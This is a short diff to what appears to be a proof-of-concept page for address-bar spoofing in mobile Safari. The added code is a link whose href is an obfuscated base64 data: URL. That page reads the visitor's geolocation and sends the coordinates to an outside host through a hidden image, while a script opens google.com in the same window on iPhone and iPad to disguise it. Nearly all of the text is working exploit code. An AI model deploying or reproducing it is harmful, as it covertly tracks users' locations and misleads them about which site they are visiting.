@@ -1,6 +1,15 @@
-data:text/html,<a href="http://.example.s3.amazonaws.com/login2">TEST</a>
+<a href="data:text/html;base64,PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ +CjxtZXRhIGNoYXJzZXQ9dXRmLTggLz4KPHRpdGxlPmdlb2xvY2F0aW9uPC90aXRsZT4KPGJvZHk+CjxzY3JpcHQ +CmZ1bmN0aW9uIHN1Y2Nlc3MocG9zaXRpb24pIHsKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlbW90ZScpLnNyYz0iaHR0cDovL3hpc2lnci5jb20vdGVzdC9nZW8v Z2V0LnBocD9nZW9sb2NhdGlvbj0iKyItLS0tLS0iK2VuY29kZVVSSUNvbXBvbmVudChwb3NpdGlvbi5jb29yZHMubGF0aXR1ZGUpKyIsIitlbmNvZGVVUklDb21wb25lb nQocG9zaXRpb24uY29vcmRzLmxvbmdpdHVkZSk7CiB9Cm5hdmlnYXRvci5nZW9sb2NhdGlvbi5nZXRDdXJyZW50UG9zaXRpb24oc3VjY2Vzcyk7Cjwvc2NyaXB0Pgo8aW 1nIGlkPSJyZW1vdGUiIHNyYz0iIiB3aWR0aD0wIGhlaWdodD0wPgo8L2JvZHk+CjwvaHRtbD4=" target="go" onclick="fake()"><h1>click  me</h1></a>
 
-Content of login2:
-<meta http-equiv="refresh" content="0; url=http://example.com/">
-
-PoC-image showing example.com with the amazonaws.com-URL in the omnibar.
+<script>
+    function fake() {
+        if (navigator.userAgent.indexOf("iPhone") > -1) {
+            setTimeout("gs()", 0);
+        }
+        if (navigator.userAgent.indexOf("iPad") > -1) {
+            setTimeout("gs()", 200);
+        }
+    }
+    function gs() {
+        window.open('http://www.google.com', 'go');
+    }
+</script>
